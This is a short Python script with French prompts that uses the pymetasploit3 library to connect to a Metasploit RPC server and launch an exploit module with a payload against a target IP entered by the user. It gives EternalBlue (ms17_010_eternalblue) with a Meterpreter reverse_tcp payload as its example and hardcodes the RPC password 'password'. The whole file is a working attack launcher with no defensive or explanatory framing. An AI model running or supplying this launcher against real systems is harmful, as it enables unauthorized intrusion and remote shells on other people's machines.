#!/usr/bin/env python3
from pymetasploit3.msfrpc import MsfRpcClient

def run_metasploit(target, exploit, payload):
    print("[*] Connexion au Metasploit Framework...")
    try:
        client = MsfRpcClient('password', port=55553)
        print("[*] Connexion réussie.")

        exploit_module = client.modules.use('exploit', exploit)
        exploit_module['RHOSTS'] = target
        payload_module = client.modules.use('payload', payload)

        print(f"[*] Lancement de l'exploit : {exploit} avec le payload : {payload}")
        job_id = exploit_module.execute(payload=payload_module)
        print(f"[*] Exploit lancé, Job ID : {job_id}")
    except Exception as e:
        print(f"[!] Échec de l'exécution de Metasploit : {e}")

if __name__ == "__main__":
    target = input("Entrez la cible (ex : 192.168.1.1) : ")
    exploit = input("Entrez l'exploit (ex : exploit/windows/smb/ms17_010_eternalblue) : ")
    payload = input("Entrez le payload (ex : windows/meterpreter/reverse_tcp) : ")
    run_metasploit(target, exploit, payload)
